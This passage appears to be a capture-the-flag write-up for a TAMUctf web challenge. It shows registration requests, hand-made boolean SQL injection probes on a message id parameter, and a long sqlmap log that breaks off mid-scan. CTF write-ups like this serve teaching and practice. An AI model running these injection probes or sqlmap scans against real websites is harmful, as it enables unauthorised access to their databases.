# 1337 Secur1ty
Web, 485 points
## Description:
A website with a registration form and a login form was linked to.
```html
            Login
             Username:
            Password:
            TOTP Code:
            Register User
            First Name:
            Last Name:
            Password:
            Phone Number:
        *** UPON REGISTRATION, ADD QR-CODE TO GOOGLE AUTHENTICATOR APP! ***
```
## Solution:
We start by registering to the service:
```console
root@kali:/media/sf_CTFs/tamu/1337_Secur1ty# curl -v "http://web6.tamuctf.com/register_user" -X POST --data "firstname=a&lastname=a&password=a&phone=1234567891&Submit=Register"
Note: Unnecessary use of -X or --request, POST is already inferred.
*   Trying 34.208.211.186...
* TCP_NODELAY set
* Connected to web6.tamuctf.com (34.208.211.186) port 80 (#0)
> POST /register_user HTTP/1.1
> Host: web6.tamuctf.com
> User-Agent: curl/7.61.0
> Accept: */*
> Content-Length: 66
> Content-Type: application/x-www-form-urlencoded
>
* upload completely sent off: 66 out of 66 bytes
From:  ()Date: //Time: Message: Back
```
However a slightly more complex value hinted that an SQLi vulnerability is indeed hiding behind the service:
```console
/media/sf_CTFs/tamu/1337_Secur1ty# curl "http://web6.tamuctf.com/message?id=1'%20and%20'1'='1"
From: Bob (ScrubLord)Date: 03/12/19Time: 19:42Message: Please don't blow off the meeting today, we need to talk about the cookies.Back
root@kali:/media/sf_CTFs/tamu/1337_Secur1ty# curl "http://web6.tamuctf.com/message?id=1'%20and%20'2'='1"
From:  ()Date: //Time: Message: Back
```
Time to fire up SQLMap:
```console
root@kali:/media/sf_CTFs/tamu/1337_Secur1ty# sqlmap -u http://web6.tamuctf.com/message?id=2
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.2.5#stable}
|_ -| . ["]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
[*] starting at 13:11:46
[13:11:47] [INFO] testing connection to the target URL
[13:11:47] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
[13:11:48] [INFO] testing if the target URL content is stable
[13:11:48] [INFO] target URL content is stable
[13:11:48] [INFO] testing if GET parameter 'id' is dynamic
[13:11:48] [INFO] confirming that GET parameter 'id' is dynamic
[13:11:48] [INFO] GET parameter 'id' is dynamic
[13:11:49] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable
[13:11:50] [INFO] testing for SQL injection on GET parameter 'id'
[13:11:50] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[13:11:53] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="we")
[13:11:56] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y
[13:12:04] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[13:12:04] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[13:12:04] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[13:12:05] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[13:12:05] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[13:12:05] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[13:12:06] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[13:12:06] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[13:12:06] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[13:12:06] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[13:12:07] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[13:12:07] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[13:12:07] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[13:12:08] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[13:12:08] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[13:12:09] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[13:12:09] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[13:12:09] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[13:12:09] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[13:12:09] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[13:12:09] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[13:12:09] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[13:12:09] [INFO] testing 'MySQL inline queries'
[13:12:09] [INFO] testing 'MySQL > 5.0.11 stacked queries (comment)'
[13:12:10] [INFO] testing 'MySQL > 5.0.11 stacked queries'
[13:12:10] [INFO] testing 'MySQL > 5.0.11 stacked queries (query SLEEP - comment)'
[13:12:10] [INFO] testing 'MySQL > 5.0.11 stacked queries (query SLEEP)'
[13:12:11] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'